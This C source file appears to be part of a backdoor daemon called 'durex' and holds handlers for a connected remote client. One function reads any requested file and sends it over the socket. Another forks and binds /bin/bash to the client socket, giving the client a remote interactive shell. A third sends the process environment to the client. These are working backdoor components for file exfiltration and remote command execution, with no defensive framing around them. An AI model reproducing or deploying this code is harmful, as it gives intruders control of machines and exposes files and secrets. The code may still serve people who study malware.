#include "durex.h"

int	_shfile(struct s_client *client, char *buf) {
	struct stat s;
	int fd, res;
	char file_buf[1024];

	while (buf && *buf != '\0' && *buf != ' ')
		buf++;
	while (*buf == ' ')
		buf++;
	if (stat(buf, &s) < 0)
	{
		_servlog("durex: File does not exist\n", client);
		return (0);
	}
	if ((fd = open(buf, O_RDONLY)) < 0)
	{
		_servlog("durex: File does not exist\n", client);
		return (0);
	}
	memset(file_buf, 0, 1024);
	while ((res = read(fd, file_buf, 1024)) > 0)
	{
		printf("%s\n", file_buf);
		send(client->fd, file_buf, res, 0);
		memset(file_buf, 0, 1024);
	}
	return (0);
}

int	_help(struct s_client *client) {
	send(client->fd, USAGEMSG, strlen(USAGEMSG), 0);
	return (0);
}

void	_shchk(struct s_client *client) {
	if (client->pid != -1)
	{
		if (kill(client->pid, 0) == -1)
			client->status = LOGGED;
	}
}

int	_shlaunch(struct s_client *client) {
	int pid = 0;
	int status;
	int fd1, fd2, fd3;

	char *const argv[] = {"/bin/sh", NULL};
	if ((pid = fork()) < 0)
		_servlog(EFORKSHELL, client);
	if (pid == 0)
	{
		printf("durex: spawned shell (%d)\n", pid);
		if ((fd1 = dup2(client->fd, 0)) == -1)
			_servlog(EDUPSHELL, client);
		if ((fd2 = dup2(client->fd, 1)) == -1)
			_servlog(EDUPSHELL, client);
		if ((fd3 = dup2(client->fd, 2)) == -1)
			_servlog(EDUPSHELL, client);
		execve("/bin/bash", argv, NULL);
	}
	else
	{
		close(client->fd);
		client->status = IN_SHELL;
		client->pid = pid;
	}
	return (IN_SHELL);
}

int	_shenv(struct s_client *client, char **envp) {
	int i;

	i = 0;
	while (envp[i]) 
	{
		send(client->fd, envp[i], strlen(envp[i]), 0);
		send(client->fd, "\n", 1, 0);
		i++;
	}
	return (0);
}
